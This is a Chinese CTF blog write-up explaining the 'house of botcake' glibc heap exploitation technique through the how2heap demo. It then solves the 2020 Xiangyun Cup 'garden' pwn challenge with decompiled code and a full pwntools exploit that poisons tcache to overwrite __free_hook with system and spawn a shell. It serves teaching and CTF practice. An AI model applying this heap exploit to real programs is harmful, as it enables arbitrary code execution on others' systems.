---
title:  how2heap-house_of_botcake-学习
categories: [CTF]
tags: [pwn]

---
在2.29版本上的libc中，由于 tcache 加入了 key 值来进行 double free 检测，以至于在旧版本时的直接进行 double free 变的无效。<!--more-->

2.29前

![image-20220615114331112](image-20220615114331112.png)

2.29后

![image-20220615114415661](image-20220615114415661.png)

这个key一般是指向 manage chunk。

## house_of_botcake的目的、本质与条件

目的：

在2.29版本上的libc中，制造堆块重叠。

本质：

利用的本质是让 chunk 在 **unsorted bin** 和 **tcache** 中同时存在，从而造成 UAF 可以修改 key 的内容。

条件:

1.我们能够控制已经free的chunk进行，再次free.(double free の变种)。

2.能填满tcache ，得到 unsorted bin。

```
NX：-z execstack / -z noexecstack (关闭 / 开启) 不让执行栈上的数据，于是JMP ESP就不能用了
Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启) 栈里插入cookie信息
PIE：-no-pie / -pie (关闭 / 开启) 地址随机化，另外打开后会有get_pc_thunk
RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启) 对GOT表具有写权限
```

## 分析源码

```c
//2.32-2.34

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>


int main()
{
    /*
     * This attack should bypass the restriction introduced in
     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
     * If the libc does not include the restriction, you can simply double free the victim and do a
     * simple tcache poisoning
     * And thanks to @anton00b and @subwire for the weird name of this technique */

    // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    // introduction
    puts("This file demonstrates a powerful tcache poisoning attack by tricking malloc into");
    puts("returning a pointer to an arbitrary location (in this demo, the stack).");
    puts("This attack only relies on double free.\n");

    // prepare the target
    intptr_t stack_var[4];
    puts("The address we want malloc() to return, namely,");
    printf("the target address is %p.\n\n", stack_var);

    // prepare heap layout
    puts("Preparing heap layout");
    puts("Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.");
    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }
    intptr_t *prev = malloc(0x100);
    printf("Allocating a chunk for later consolidation: prev @ %p\n", prev);
    intptr_t *a = malloc(0x100);
    printf("Allocating the victim chunk: a @ %p\n", a);
    puts("Allocating a padding to prevent consolidation.\n");
    malloc(0x10);
    
    // cause chunk overlapping
    puts("Now we are able to cause chunk overlapping");
    puts("Step 1: fill up tcache list");
    for(int i=0; i<7; i++){
        free(x[i]);
    }
    puts("Step 2: free the victim chunk so it will be added to unsorted bin");
    free(a);
    
    puts("Step 3: free the previous chunk and make it consolidate with the victim chunk.");
    free(prev);
    
    puts("Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n");
    malloc(0x100);
    /*VULNERABILITY*/
    free(a);// a is already freed
    /*VULNERABILITY*/

    puts("Now we have the chunk overlapping primitive:");
    int prev_size = prev[-1] & 0xff0;
    int a_size = a[-1] & 0xff0;
    printf("prev @ %p, size: %#x, end @ %p\n", prev, prev_size, (void *)prev+prev_size);
    printf("victim @ %p, size: %#x, end @ %p\n", a, a_size, (void *)a+a_size);
    a = malloc(0x100);
    memset(a, 0, 0x100);
    prev[0x110/sizeof(intptr_t)] = 0x41414141;
    assert(a[0] == 0x41414141);

    return 0;
}
```

首先，我们分配了7个chunk来为以后填满tcache做准备：

```c
    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }
```

然后再准备用于攻击的两个chunk，和隔离的chunk。其中a chunk 是我们将要 double free的chunk，prev chunk 是将用于辅助uaf的chunk。

```c
    intptr_t *prev = malloc(0x100);
    printf("Allocating a chunk for later consolidation: prev @ %p\n", prev);
    intptr_t *a = malloc(0x100);
    printf("Allocating the victim chunk: a @ %p\n", a);
    puts("Allocating a padding to prevent consolidation.\n");
    malloc(0x10);
```

之后，我们再释放掉a chunk  和prev chunk ，由于tachebins 满了，a chunk 和prev chunk 将加入 unsortedbin中。同时由于a chunk 和prev chunk 相邻，a chunk 和prev chunk 将合并成为一个大的chunk 放入 unsortedbin。

```c
    puts("Step 2: free the victim chunk so it will be added to unsorted bin");
    free(a);
    
    puts("Step 3: free the previous chunk and make it consolidate with the victim chunk.");
    free(prev);
```

这时，我们从tachebins中取出一个chunk：

```c
malloc(0x100);
```

这样我们tachebins中就只有6个 chunk了，这时我们再free a chunk。由于tachebins未满，所以我们的a chunk将会加入tachebins中。

```c
    malloc(0x100);
    /*VULNERABILITY*/
    free(a);// a is already freed
    /*VULNERABILITY*/

    puts("Now we have the chunk overlapping primitive:");
    int prev_size = prev[-1] & 0xff0;
    int a_size = a[-1] & 0xff0;
    printf("prev @ %p, size: %#x, end @ %p\n", prev, prev_size, (void *)prev+prev_size);
    printf("victim @ %p, size: %#x, end @ %p\n", a, a_size, (void *)a+a_size);
    a = malloc(0x100);
    memset(a, 0, 0x100);
    prev[0x110/sizeof(intptr_t)] = 0x41414141;
    assert(a[0] == 0x41414141);
```

![image-20220615102654063](image-20220615102654063.png)

于是，a chunk即在tachebins中，又和prev chunk一起在 unsortedbin 中。这样我们就完成house_of_botcake攻击。可以进而通过prev chunk 用 A chunk进行任意地址写。 



## 例题解析-祥云杯2020-garden

### 题目分析

![image-20220615221726509](image-20220615221726509.png)



题目保护全开，同时是2.31版本。

分析流程，发现题目只有添加chunk，释放，显示内容，退出四种功能。

但用两种添加chunk和释放chunk的功能：

```c
int add()
{
  int v1; // [rsp+Ch] [rbp-4h]

  puts("tree index?");
  v1 = sub_11C5();
  if ( v1 < 0 || v1 > 8 || qword_4060[v1] )
    return puts("invalid index");
  qword_4060[v1] = (const char *)malloc(0x100uLL);
  puts("tree name?");
  return read(0, (void *)qword_4060[v1], 0x100uLL);
}
```

很平凡的添加功能，但只能申请0x100大小空间的chunk(0x110).且只能申请8个.

```c
int name()
{
  int result; // eax

  if ( dword_4050 )
    exit(1);
  puts("do you want to name the garden?");
  malloc(0x20uLL);
  result = puts("sorry, you can't");
  dword_4050 = 1;
  return result;
}
```

只能调用一次的，添加功能但可以申请0x20大小空间的chunk（0x30）

```c
int free_0()
{
  const char **v0; // rax
  int v2; // [rsp+Ch] [rbp-4h]

  puts("tree index?");
  v2 = sub_11C5();
  if ( v2 >= 0 && v2 <= 8 && qword_4060[v2] )
  {
    free((void *)qword_4060[v2]);
    v0 = qword_4060;
    qword_4060[v2] = 0LL;
  }
  else
  {
    LODWORD(v0) = puts("invalid index");
  }
  return (signed int)v0;
}
```

很常见的正常释放chunk操作，再free chunk 后，会清空指针。

```c
void free_1()
{
  int v0; // [rsp+Ch] [rbp-4h]

  if ( dword_4054 )
    exit(1);
  puts("which tree do you want to steal?");
  v0 = sub_11C5();
  if ( v0 >= 0 && v0 <= 8 && qword_4060[v0] )
    free((void *)qword_4060[v0]);
  dword_4054 = 1;
}
```

在free chunk 后，不会清空指针。但是只能清空一次。

### 解题思路

我们可以，释放8个0x100chunk,让一个chunk 加入 unsorted bin 中，再利用name()函数，让 unsorted bin 大小小于0x100 。

我们再在add 8 个0x100 chunk，这时unsorted bin (小于0x100) 也不会利用。

释放 unsorted bin 后面相邻0x100 chunk（a chunk） ,并保留指针。两个chunk 合并成大的unsorted bin

 chunk。

再add 一个 0x100 chunk，让  tcache 未满，再free  a chunk 这时 a chunk进入  0x100 chunk。但同时也在于unsorted bin中。形成重叠。

再利用重叠部分uaf泄露libc，再修改fd进行任意地址写，在`__free_hook`写入后门。



```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

'''
@File    :   exp.py
@Time    :   2022/06/15 16:46:39
@Author  :   lexsd6
'''

from pwn import * 
from libcfind import *

local_mote=1
elf='./garden'
e=ELF(elf)
context.arch=e.arch
context.log_level = 'debug'
ip_port=['',]

debug=lambda gdb_cmd='': gdb.attach(p,gdb_cmd) if local_mote==1 else None

if local_mote==1 :
   p=process(elf)
else :
   p=remote(ip_port[0],ip_port[-1])


def add(num,text):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil('tree index?')
    p.sendline(str(num))
    p.recvuntil('tree name?')
    p.sendline(text)

def free(num):
    p.recvuntil('>>')
    p.sendline('2')
    p.recvuntil('tree index?')
    p.sendline(str(num))
def free_0(num):
    p.recvuntil('>>')
    p.sendline('5')
    p.recvuntil('which tree do you want to steal?')
    p.sendline(str(num))
def show(num):
    p.recvuntil('>>')
    p.sendline('3')
    p.recvuntil('tree index?')
    p.sendline(str(num))

def name():
    p.recvuntil('>>')
    p.sendline('6')



for i in range(8):
    add(i,'1111')

free(0)
free(1)
free(2)
free(3)
#free(4)
free(5)
free(6)
free(7)
free(4)
name()  #制造0xe0

for i in range(8):
    add(i,'1111')
free(0)
free(1)
#free(2)
free(3)
free(4)
free(5)
free(6)
free(7)

free_0(2) #让0x100与0xe0合并制造出unsertedbin 效果
add(0,'1')
free(2)
add(1,'xx')

add(2,'111')
add(3,'111')
add(4,'111')
add(5,'111')
add(6,'111')
add(7,'111')
add(8,'')
show(8)#泄露libc地址

#传统劫持tache，任意地址写
addr=(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
log.info(hex(addr))
malloc_hook=addr+0x26
log.info(hex(malloc_hook))
free(3)
free(1)
free(8)
x=finder('__malloc_hook',malloc_hook)
add(8,'t'*0xe0+p64(x.dump('__free_hook')))
add(1,'/bin/sh\x00')
add(3,p64(x.dump('system')))
debug()

p.interactive()
```

